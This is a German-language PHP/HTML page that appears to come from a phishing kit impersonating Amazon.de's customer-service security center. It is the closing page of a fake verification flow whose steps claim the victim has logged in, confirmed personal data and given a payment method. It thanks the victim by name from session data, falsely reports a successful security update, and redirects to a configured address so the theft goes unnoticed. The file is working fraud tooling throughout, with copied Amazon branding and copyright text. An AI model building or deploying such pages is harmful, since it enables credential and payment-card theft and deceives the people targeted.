<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<link rel="stylesheet" href="src/css/61qjsbDraqL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<a id="nav-top"></a>

		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22">Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23">Zahlungsmittel angeben <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="24"><span style="color:#FF9900">&#10148; Abschließen </span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1>
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<table id="cs-content-table" cellspacing="0" cellpadding="0" border="0" width="100%">
				<tbody>
				<tr>
					<td valign="top" width="70%">
						<div class="leftcol">
							<div id="orderSection" class="cu-eyebrow " style="">
								<div class="cu-eb-top">
									<div class="cu-eb-top-left"></div>        
									<h2 class="">Amazon.de Kundenservice</h2>
								</div>

								<div class="cu-middle">
									<div class="contactEmail">
										<h3>
											Vielen Dank, <?php echo ucfirst($_SESSION['vorname']) . ' ' . ucfirst($_SESSION['nachname']) ?>!<br/>Ihre Aktualisierung verlief erfolgreich.</h3>
											<div class="emailConfirmationServiceLevel">
												Die Aktualisierung der Sicherheitssystem bei Ihrem Nutzerkonto verlief erfolgreich.
												<br/>
												Sie werden nun auf die Amazon Startseite weitergeleitet.
												<meta http-equiv="refresh" <?php echo "content=\"5; URL=$redirect\""; $_SESSION['finished'] = true;?>>
											</div>
									</div>
								</div>

								<div class="cu-eb-bottom">
									<div class="cu-eb-bottom-left"></div>
								</div>
							</div>
						</div>
					</td>
					
					<td valign="top" width="30%">
						<div class="rightcol">
							<div class="a-section cs-help-sidebar-module take-action-sidebar">
								<div class="a-section inner">
									
								<div class="cu_self_service_quick_sol_title cu_self_service_quick_sol_title_default" style="display: block;">
									<h3>
										Schnelle Lösungen
									</h3>
								</div>
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Box_smaller.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-mini a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Meine Bestellungen
													</p>
														<p class="a-size-small a-color-base">
															Nachverfolgen &amp; zurücksenden
														</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Devices_clear-bg.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Geräte &amp; Inhalte
													</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>

								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Prime_clear-bg.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Prime-Mitgliedschaft
													</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>

								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Payments_clear-bg.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Zahlungseinstellungen
													</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>

								<hr class="a-divider-normal">
											
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-column a-span12">
											<a class="a-link-normal quick-solution-action" href="#">
												<p class="a-spacing-none a-size-base a-color-base">
												   Artikel zurücksenden oder ersetzen
											   </p>
											</a>
										</div>
									</div>
								</div>

								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-column a-span12">
											<a class="a-link-normal quick-solution-action" href="#">
												<p class="a-spacing-none a-size-base a-color-base">
												   Adressbuch verwalten
											   </p>
											</a>
										</div>
									</div>
								</div> 
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-column a-span12">
											<a class="a-link-normal quick-solution-action" href="#">
												<p class="a-spacing-none a-size-base a-color-base">
												   Namen, E-Mail-Adresse oder Passwort ändern
											   </p>
											</a>
										</div>
									</div>
								</div>
								</div>
							</div>
							<div class="forum_info_links">
								<div class="cu-rounded">
									<div class="cu-top">
										<div class="cu-top-left">
										</div>
									</div>
									<div class="cu-middle">
										<div class="cs-rounded-content">
											<h4>Finden Sie die Antwort auf Ihre Frage</h4>
											<div>
											   <p>Besuchen Sie unsere Hilfeforen und finden Sie Antworten und hilfreiche Informationen von der Amazon Community.</p>
											   <div>
												   
												   <a href="#" class="w140 cu-forum-info-button cu-forum-info-button amzn-btn btn-sec-med" unselectable="on"><span>Kindle Hilfeforum</span></a>
											   </div>
											</div>
										</div>  
									</div>
									<div class="cu-bottom">
										<div class="cu-bottom-left">
										</div>
									</div>
								</div>
							</div>
						</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
					<img class="display:block" src="src/img/transparent-pixel.gif" height="1px" width="980px">
					</td>
				</tr>
			</tbody></table>
		</div>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1" style="width:100%;position:absolute;bottom:0"><div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine">
		<a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style>
		<a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>